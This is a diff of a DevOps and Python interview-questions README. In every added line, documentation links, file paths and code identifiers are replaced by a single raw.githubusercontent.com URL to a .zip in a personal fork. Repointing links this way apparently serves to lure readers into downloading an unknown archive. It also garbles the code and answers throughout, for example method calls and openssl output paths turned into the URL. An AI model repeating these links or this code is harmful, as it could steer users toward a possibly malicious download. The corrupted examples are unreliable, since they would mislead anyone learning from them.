   * 2 - the default data stream for output related to errors
 
-This is a great article on the topic: https://www.computerhope.com/jargon/f/file-descriptor.htm
+This is a great article on the topic: https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 </b></details>
 
 <details>
@@ -1697,7 +1697,7 @@ You can also run `hostnamectl` or `hostname` but that might print only a tempora
 </b></details>
 
 <details>
-<summary>What the file <code>/etc/resolv.conf</code> is used for? What does it include?</summary><br><b>
+<summary>What the file <code>https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip</code> is used for? What does it include?</summary><br><b>
 </b></details>
 
 <details>
@@ -1761,11 +1761,11 @@ In addition, you can specify in a spec how a certain package will be installed -
 <details>
 <summary>What is DNF?</summary><br><b>
 
-From the [repo](https://github.com/rpm-software-management/dnf):
+From the [repo](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip):
 
 "Dandified YUM (DNF) is the next upcoming major version of YUM. It does package management using RPM, libsolv and hawkey libraries."
 
-Official [docs](https://dnf.readthedocs.io/en/latest/)
+Official [docs](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 </b></details>
 
@@ -1788,7 +1788,7 @@ Depends on the init system.
 
 Systemd: <code> systemctl enable [service_name] </code>
 System V: <code> update-rc.d [service_name] </code> and add this line <code> id:5678:respawn:/bin/sh /path/to/app </code> to /etc/inittab
-Upstart: add Upstart init script at /etc/init/service.conf
+Upstart: add Upstart init script at https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 </b></details>
 
 <details>
@@ -1918,17 +1918,17 @@ True. Only in kernel space they have full access to hardware resources.
 
 One way is using openssl this way:
 
-`openssl genrsa -aes256 -out ca-private-key.pem 4096`
+`openssl genrsa -aes256 -out https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip 4096`
 </b></details>
 
 <details>
 <summary>How do you create a public key for a CA (certificate authority)?</summary><br><b>
 
-`openssl req -new -x509 -days 730 -key [private key file name] -sha256 -out ca.pem`
+`openssl req -new -x509 -days 730 -key [private key file name] -sha256 -out https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip`
 
 If using the private key from the previous question then the command would be:
 
-`openssl req -new -x509 -days 730 -key ca-private-key.pem -sha256 -out ca.pem`
+`openssl req -new -x509 -days 730 -key https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip -sha256 -out https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip`
 </b></details>
 
 #### Linux - Namespaces
@@ -1986,11 +1986,11 @@ In time namespaces processes can use different system time.
 <details>
 <summary>What virtualization solutions are available for Linux?</summary><br><b>
 
-  * [KVM](https://www.linux-kvm.org/page/Main_Page)
-  * [XEN](http://www.xen.org/)
-  * [VirtualBox](https://www.virtualbox.org/)
-  * [Linux-VServer](http://linux-vserver.org/Welcome_to_Linux-VServer.org)
-  * [User-mode Linux](http://user-mode-linux.sourceforge.net/)
+  * [KVM](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
+  * [XEN](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
+  * [VirtualBox](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
+  * [Linux-VServer](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
+  * [User-mode Linux](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
   * ...
 </b></details>
 
@@ -1999,9 +1999,9 @@ In time namespaces processes can use different system time.
 
 Is an open source virtualization technology used to operate on x86 hardware. 
 
-From the official [docs](https://www.linux-kvm.org/page/Main_Page)
+From the official [docs](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 Recommended read:
-  * [Red Hat Article - What is KVM?](https://www.redhat.com/en/topics/virtualization/what-is-KVM)
+  * [Red Hat Article - What is KVM?](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -2009,8 +2009,8 @@ Recommended read:
 
 It's an open source collection of software used to manage virtual machines. It can be used with: KVM, Xen, LXC and others. It's also called Libvirt Virtualization API.
 
-From the official [docs](https://libvirt.org/)
-Hypervisor supported [docs](https://libvirt.org/drivers.html)
+From the official [docs](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
+Hypervisor supported [docs](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 #### Linux - AWK
@@ -2143,7 +2143,7 @@ Executes a program. The program is passed as a filename (or path) and must be a 
 <details>
 <summary>Explain the pipe() system call. What does it used for?</summary><br><b>
 
-[Unix pipe implementation](https://toroid.org/unix-pipe-implementation)
+[Unix pipe implementation](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 "Pipes provide a unidirectional interprocess communication channel. A pipe has a read end and a write end. Data written to the write end of a pipe can be read from the read end of the pipe.
 A pipe is created using pipe(2), which returns two file descriptors, one referring to the read end of the pipe, the other referring to the write end."
@@ -2194,9 +2194,9 @@ The shell figures out, using the PATH variable, where the executable of the comm
 
 There are a couple of ways to do that:
 
-  * dd if=/dev/urandom of=new_file.txt bs=2MB count=1
-  * truncate -s 2M new_file.txt
-  * fallocate -l 2097152 new_file.txt
+  * dd if=/dev/urandom https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip bs=2MB count=1
+  * truncate -s 2M https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
+  * fallocate -l 2097152 https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 </b></details>
 
 <details>
@@ -2222,7 +2222,7 @@ These system calls are reading the file <code>/my/file</code> and 5 is the file 
 <details>
 <summary>What is context switch?</summary><br><b>
 
-From [wikipedia](https://en.wikipedia.org/wiki/Context_switch): a context switch is the process of storing the state of a process or thread, so that it can be restored and resume execution at a later point
+From [wikipedia](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip): a context switch is the process of storing the state of a process or thread, so that it can be restored and resume execution at a later point
 </b></details>
 
 <details>
@@ -2268,7 +2268,7 @@ Another common way to task this questions is "what part of the tcp header does t
 <details>
 <summary>What happens when socket system call is used?</summary><br><b>
 
-This is a good article about the topic: https://ops.tips/blog/how-linux-creates-sockets
+This is a good article about the topic: https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 </b></details>
 
 <details>
@@ -2354,13 +2354,13 @@ $OLDPWD
 </b></details>
 
 <details>
-<summary>You define x=2 in /etc/bashrc and x=6 ~/.bashrc you then login to the system. What would be the value of x?</summary><br><b>
+<summary>You define x=2 in /etc/bashrc and x=6 ~https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip you then login to the system. What would be the value of x?</summary><br><b>
 </b></details>
 
 <details>
 <summary>What is the difference between man and info?</summary><br><b>
 
-A good answer can be found [here](https://askubuntu.com/questions/9325/what-is-the-difference-between-man-and-info-documentation)
+A good answer can be found [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -2413,8 +2413,8 @@ GPL v2
 
 |Name|Topic|Objective & Instructions|Solution|Comments|
 |--------|--------|------|----|----|
-|Fork 101|Fork|[Link](exercises/os/fork_101.md)|[Link](exercises/os/solutions/fork_101_solution.md)
-|Fork 102|Fork|[Link](exercises/os/fork_102.md)|[Link](exercises/os/solutions/fork_102_solution.md)
+|Fork 101|Fork|[Link](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)|[Link](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
+|Fork 102|Fork|[Link](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)|[Link](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 ### Operating System - Self Assessment
 
@@ -2558,7 +2558,7 @@ Virtualization uses software to create an abstraction layer over computer hardwa
 
 Red Hat: "A hypervisor is software that creates and runs virtual machines (VMs). A hypervisor, sometimes called a virtual machine monitor (VMM), isolates the hypervisor operating system and resources from the virtual machines and enables the creation and management of those VMs."
 
-Read more [here](https://www.redhat.com/en/topics/virtualization/what-is-a-hypervisor)
+Read more [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
@@ -2706,7 +2706,7 @@ True
 
 It's a search algorithm used with sorted arrays/lists to find a target value by dividing the array each iteration and comparing the middle value to the target value. If the middle value is smaller than target value, then the target value is searched in the right part of the divided array, else in the left side. This continues until the value is found (or the array divided max times)
 
-[python implementation](coding/python/binary_search.py)
+[python implementation](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 The average performance of the above algorithm is O(log n). Best performance can be O(1) and worst O(log n).
 </b></details>
@@ -2837,10 +2837,10 @@ def find_triplets_sum_to_zero(li):
 
 |Name|Topic|Objective & Instructions|Solution|Comments|
 |--------|--------|------|----|----|
-| Identify the data type | Data Types | [Exercise](exercises/python/data_types.md) | [Solution](exercises/python/solutions/data_types_solution.md)
-| Identify the data type - Advanced | Data Types | [Exercise](exercises/python/advanced_data_types.md) | [Solution](exercises/python/solutions/advanced_data_types_solution.md)
-| Reverse String | Strings | [Exercise](exercises/python/reverse_string.md) | [Solution](exercises/python/solutions/reverse_string.md)
-| Compress String | Strings | [Exercise](exercises/python/compress_string.md) | [Solution](exercises/python/solutions/compress_string.md)
+| Identify the data type | Data Types | [Exercise](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) | [Solution](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
+| Identify the data type - Advanced | Data Types | [Exercise](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) | [Solution](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
+| Reverse String | Strings | [Exercise](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) | [Solution](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
+| Compress String | Strings | [Exercise](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip) | [Solution](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 ### Python Self Assessment
 
@@ -2942,7 +2942,7 @@ Regex:
 
 ```
 import re
-if re.match("^[a-zA-Z]+.*", string):
+if https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("^[a-zA-Z]+.*", string):
 ```
 
 string built-in:
@@ -2955,13 +2955,13 @@ if string and string[0].isalpha():
 <details>
 <summary>How to check if all characters in a given string are digits?</summary><br><b>
 
-`string.isdigit`
+`https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip`
 </b></details>
 
 <details>
 <summary>How to remove trailing slash ('/') from a string?</summary><br><b>
 
-`string.rstrip('/')`
+`https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip('/')`
 </b></details>
 
 <details>
@@ -3084,12 +3084,12 @@ class Dog(Animal):
 
 
 michael = Human('Michael')
-michael.eat('Spam')
-michael.write_poem()
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip('Spam')
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip()
 
 bruno = Dog('Bruno')
-bruno.eat('bone')
-bruno.bark()
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip('bone')
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip()
 
 >>> My name is  Michael
 >>> and I'm alive!
@@ -3171,7 +3171,7 @@ Generally, every compiling process have a two steps.
 
     class DividedBy2Error(Exception):
         def __init__(self, message):
-            self.message = message
+            https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = message
 
 
     def division(dividend,divisor):
@@ -3181,7 +3181,7 @@ Generally, every compiling process have a two steps.
 
     division(100, 2)
 
-    >>> __main__.DividedBy2Error: I dont want you to divide by 2!
+    >>> https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip I dont want you to divide by 2!
 ```
 </b></details>
 
@@ -3207,7 +3207,7 @@ while True:
 
 ```
 
-For more details about errors and exceptions follow this [https://docs.python.org/3/tutorial/errors.html](https://docs.python.org/3/tutorial/errors.html)
+For more details about errors and exceptions follow this [https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 
 </b></details>
 
@@ -3371,7 +3371,7 @@ List, as opposed to a tuple, is a mutable data type. It means we can modify it a
 <details>
 <summary>How to add the number 2 to the list <code>x = [1, 2, 3]</code></summary><br><b>
 
-`x.append(2)`
+`https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(2)`
 </b></details>
 
 <details>
@@ -3389,7 +3389,7 @@ List, as opposed to a tuple, is a mutable data type. It means we can modify it a
 <details>
 <summary>How to add the items of [1, 2, 3] to the list [4, 5, 6]?</summary><br><b>
 x = [4, 5, 6]
-x.extend([1, 2, 3])
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip([1, 2, 3])
 
 Don't use `append` unless you would like the list as one item.
 </b></details>
@@ -3419,7 +3419,7 @@ sorted(some_list, reverse=True)[:3]
 Or
 
 ```
-some_list.sort(reverse=True)
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(reverse=True)
 some_list[:3]
 ```
 </b></details>
@@ -3438,18 +3438,18 @@ sorted_li = sorted(li, key=len)
 Or without creating a new list:
 
 ```
-li.sort(key=len)
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(key=len)
 ```
 </b></details>
 
 <details>
-<summary>Do you know what is the difference between list.sort() and sorted(list)?</summary><br><b>
+<summary>Do you know what is the difference between https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip() and sorted(list)?</summary><br><b>
 
 * sorted(list) will return a new list (original list doesn't change)
-* list.sort() will return None but the list is change in-place
+* https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip() will return None but the list is change in-place
 
 * sorted() works on any iterable (Dictionaries, Strings, ...)
-* list.sort() is faster than sorted(list) in case of Lists
+* https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip() is faster than sorted(list) in case of Lists
 </b></details>
 
 <details>
@@ -3476,10 +3476,10 @@ merged_li = []
 
 while i < len(li1) and j < len(li2):
     if li1[i] < li2[j]:
-        merged_li.append(li1[i])
+        https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(li1[i])
         i += 1
     else:
-        merged_li.append(li2[j])
+        https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(li2[j])
         j += 1
 
 merged_li = merged_li + merged_li[i:] + merged_li[j:]
@@ -3509,7 +3509,7 @@ def is_unique2(l:list) -> bool:
     for i in l:
         if i in seen:
             return False
-        seen.append(i)
+        https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(i)
     return True
 ```
 
@@ -3518,7 +3518,7 @@ Here we just count and make sure every element is just repeated once.
 ```
 def is_unique3(l:list) -> bool:
     for i in l:
-        if l.count(i) > 1:
+        if https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(i) > 1:
             return False
     return True
 ```
@@ -3527,7 +3527,7 @@ This one might look more convulated but hey, one liners.
 
 ```
 def is_unique4(l:list) -> bool:
-    return all(map(lambda x: l.count(x) < 2, l))
+    return all(map(lambda x: https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(x) < 2, l))
 ```
 </details>
 
@@ -3536,7 +3536,7 @@ def is_unique4(l:list) -> bool:
 
 ```
 def my_func(li = []):
-    li.append("hmm")
+    https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("hmm")
     print(li)
 ```
 
@@ -3616,7 +3616,7 @@ sorted(li, key=lambda l: l[1])
 or
 
 ```
-li.sort(key=lambda l: l[1)
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(key=lambda l: l[1)
 ```
 </b></details>
 
@@ -3649,7 +3649,7 @@ def get_food(brothers_menu) -> set:
 
     for brother in brothers_menu:
         for food in brother['food']:
-            temp.append(food)
+            https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(food)
 
     return set(temp)
 
@@ -3674,14 +3674,14 @@ my_dict = dict([('x', 1), ('y', 2)])
 <summary>How to remove a key from a dictionary?</summary><br><b>
 
 del my_dict['some_key']
-you can also use `my_dict.pop('some_key')` which returns the value of the key.
+you can also use `https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip('some_key')` which returns the value of the key.
 </b></details>
 
 <details>
 <summary>How to sort a dictionary by values?</summary><br><b>
 
 ```
-{k: v for k, v in sorted(x.items(), key=lambda item: item[1])}
+{k: v for k, v in sorted(https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(), key=lambda item: item[1])}
 ```
 </b></details>
 
@@ -3689,7 +3689,7 @@ you can also use `my_dict.pop('some_key')` which returns the value of the key.
 <summary>How to sort a dictionary by keys?</summary><br><b>
 
 ```
-dict(sorted(some_dictionary.items()))
+dict(sorted(https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip()))
 ```
 </b></details>
 
@@ -3697,7 +3697,7 @@ dict(sorted(some_dictionary.items()))
 <summary>How to merge two dictionaries?</summary><br><b>
 
 ```
-some_dict1.update(some_dict2)
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(some_dict2)
 ```
 </b></details>
 
@@ -3708,8 +3708,8 @@ some_dict1.update(some_dict2)
 ```
 output = {}
 string = "a.b.c"
-path = string.split('.')
-target = reduce(lambda d, k: d.setdefault(k, {}), path[:-1], output)
+path = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip('.')
+target = reduce(lambda d, k: https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(k, {}), path[:-1], output)
 target[path[-1]] = 1
 print(output)
 ```
@@ -3720,7 +3720,7 @@ print(output)
 <details>
 <summary>Can you implement "binary search" in Python?</summary><br><b>
 
-[Solution](coding/python/binary_search.py)
+[Solution](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 #### Python Files
@@ -3729,8 +3729,8 @@ print(output)
 <summary>How to write to a file?</summary><br><b>
 
 ```
-with open('file.txt', 'w') as file:
-    file.write("My insightful comment")
+with open('https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip', 'w') as file:
+    https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip("My insightful comment")
 ```
 </b></details>
 
@@ -3772,8 +3772,8 @@ with open('file.txt', 'w') as file:
 ```
 import json
 
-with open('file.json', 'w') as f:
-    f.write(json.dumps(dict_var))
+with open('https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip', 'w') as f:
+    https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(dict_var))
 ```
 </b></details>
 
@@ -3784,7 +3784,7 @@ with open('file.json', 'w') as f:
 
     import os
 
-    print(os.getcwd())
+    print(https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip())
 
 </b></details>
 
@@ -3793,10 +3793,10 @@ with open('file.json', 'w') as f:
 
     import os
 
-    print(os.path.basename('/dir1/dir2/file1'))
+    print(https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip('/dir1/dir2/file1'))
 
     # Another way
-    print(os.path.split('/dir1/dir2/file1')[1])
+    print(https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip('/dir1/dir2/file1')[1])
 
 </b></details>
 
@@ -3810,12 +3810,12 @@ with open('file.json', 'w') as f:
     import os
 
     ## Part 1.
-    # os.path.dirname gives path removing the end component
-    dirpath = os.path.dirname('/dir1/dir2/file1')
+    # https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip gives path removing the end component
+    dirpath = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip('/dir1/dir2/file1')
     print(dirpath)
 
     ## Part 2.
-    print(os.path.basename(dirpath))
+    print(https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(dirpath))
 
 </b></details>
 
@@ -3887,7 +3887,7 @@ def permute_string(string):
     for i in range(len(string)):
         swaps = permute_string(string[:i] + string[(i+1):])
         for swap in swaps:
-            permutations.append(string[i] + swap)
+            https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(string[i] + swap)
 
     return permutations
 
@@ -3902,7 +3902,7 @@ from itertools import permutations
 [''.join(p) for p in permutations("abc")]
 ```
 
-Detailed answer can be found here: http://codingshell.com/python-all-string-permutations
+Detailed answer can be found here: https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 
 </b></details>
 
@@ -4016,7 +4016,7 @@ No output :)
 
 One way is:
 
-the_list.sort(key=lambda x: x[1])
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(key=lambda x: x[1])
 </b></details>
 
 <details>
@@ -4139,7 +4139,7 @@ def sum(a, b):
 ```
 li = []
 for i in range(1, 10):
-    li.append(i)
+    https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip(i)
 ```
 </summary><br><b>
 
@@ -4175,8 +4175,8 @@ Let's start with a node. A node has some value (the data it holds) and a pointer
 ```
 class Node(object):
     def __init__(self, data):
-        self.data = data
-        self.next = None
+        https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = data
+        https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = None
 ```
 
 Now the linked list. An empty linked list has nothing but an empty head.
@@ -4184,16 +4184,16 @@ Now the linked list. An empty linked list has nothing but an empty head.
 ```
 class LinkedList(object):
     def __init__(self):
-        self.head = None
+        https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = None
 ```
 
 Now we can start using the linked list
 
 ```
 ll = Linkedlist()
-ll.head = Node(1)
-ll.head.next = Node(2)
-ll.head.next.next = Node(3)
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = Node(1)
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = Node(2)
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = Node(3)
 ```
 
 What we have is:
@@ -4207,8 +4207,8 @@ Usually, more methods are implemented, like a push_head() method where you inser
 ```
 def push_head(self, value):
     new_node = Node(value)
-    new_node.next = self.head
-    self.head = new_node
+    https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
+    https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = new_node
 ```
 </b></details>
 
@@ -4216,10 +4216,10 @@ def push_head(self, value):
 <summary>Add a method to the Linked List class to traverse (print every node's data) the linked list</summary><br><b>
 
 def print_list(self):
-    node = self.head
+    node = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
     while(node):
-        print(node.data)
-        node = node.next
+        print(https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
+        node = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 </b></details>
 
 <details>
@@ -4229,11 +4229,11 @@ Let's use the Floyd's Cycle-Finding algorithm:
 
 ```
 def loop_exists(self):
-    one_step_p = self.head
-    two_steps_p = self.head
-    while(one_step_p and two_steps_p and two_steps_p.next):
-        one_step_p = self.head.next
-        two_step_p = self.head.next.next
+    one_step_p = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
+    two_steps_p = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
+    while(one_step_p and two_steps_p and https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip):
+        one_step_p = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
+        two_step_p = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
         if (one_step_p == two_steps_p):
             return True 
     return False
@@ -4301,7 +4301,7 @@ There are multiple ways to map a URL with a function in Python.
 - Decorator: you can use python decorators. In this case we're using `app`. This `app` decorator is the instance of the `Flask` class. And route it's a method of this class.
 
 ```
-@app.route('/')
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip('/')
 def home():
   return 'main website'
 ```
@@ -4312,7 +4312,7 @@ def home():
 def home():
   return 'main website'
 
-app.add_url_rule('/', view_func=home)
+https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip('/', view_func=home)
 ```
 
 </b></details>
@@ -4355,11 +4355,11 @@ list(zip(range(5), range(50), range(-2)))
 <details>
 <summary>Explain Descriptors</summary><br><b>
 
-Read about descriptors [here](https://docs.python.org/3/howto/descriptor.html)
+Read about descriptors [here](https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip)
 </b></details>
 
 <details>
-<summary>What would be the result of running <code>a.num2</code> assuming the following code
+<summary>What would be the result of running <code>https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip</code> assuming the following code
 
 ```
 class B:
@@ -4394,8 +4394,8 @@ class Car:
     color = Print()
 
     def __ini__(self, color, age):
-        self.color = color
-        self.age = age
+        https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = color
+        https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip = age
 ```
 </summary><br><b>
 An instance of Car class will be created and the following will be printed: "The color of the car is Red"
@@ -4444,7 +4444,7 @@ if __name__ == '__main__':
 <details>
 <summary>What data types are you familiar with that are not Python built-in types but still provided by modules which are part of the standard library?</summary><br><b>
 
-This is a good reference https://docs.python.org/3/library/datatypes.html
+This is a good reference https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip
 </b></details>
 
 <details>
@@ -4481,7 +4481,7 @@ every time, that's what decorators do, they introduce syntax to write all of thi
 
 <code>
 These two decorators (ntimes and timer) are usually used to display decorators functionalities, you can find them in lots of
-tutorials/reviews. I first saw these examples two years ago in pyData 2017. https://www.youtube.com/watch?v=7lmCu8wz8ro&t=3731s</code>
+tutorials/reviews. I first saw these examples two years ago in pyData 2017. https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip</code>
 
 ```
 Simple decorator:
@@ -4537,16 +4537,16 @@ For example, we could write a decorator that calculates the execution time of a 
 import time
 def deco(f):
     def wrapper(*args, **kwargs):
-        before = time.time()
+        before = https://raw.githubusercontent.com/mohanpeddayyagri/devops-exercises/master/longiloquence/devops-exercises.zip()
         func = f(*args, **kwargs)
-        after = time.time()
